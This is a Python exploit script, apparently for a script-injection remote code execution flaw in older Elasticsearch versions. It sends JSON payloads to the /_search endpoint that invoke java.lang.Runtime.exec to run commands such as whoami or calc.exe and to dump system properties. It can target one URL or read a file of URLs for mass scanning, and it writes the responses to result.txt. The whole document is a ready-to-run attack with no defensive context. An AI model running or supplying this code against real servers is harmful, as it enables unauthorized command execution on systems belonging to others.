# -*- coding: utf-8 -*-
import json
import requests
import sys
import argparse

succlog=open('result.txt','a')

def exploit(target):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
    payload1 = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"C:\\/Windows\\/System32\\/calc.exe\\").getText()"}}}' #execute code
    payload2 = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\\"java.lang.System\\").getProperties()"}}}' #get system information
    payload3 = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}'
    try:
        url = "%s/_search?pretty" %(target)
        r = requests.post(url=url, data=payload3,headers=headers,timeout=5)
        succlog.write(url+'\n'+r.text+'\n')
    except:
        pass

if __name__=='__main__':
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url!='':
        exploit(url)
    if file!="":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url)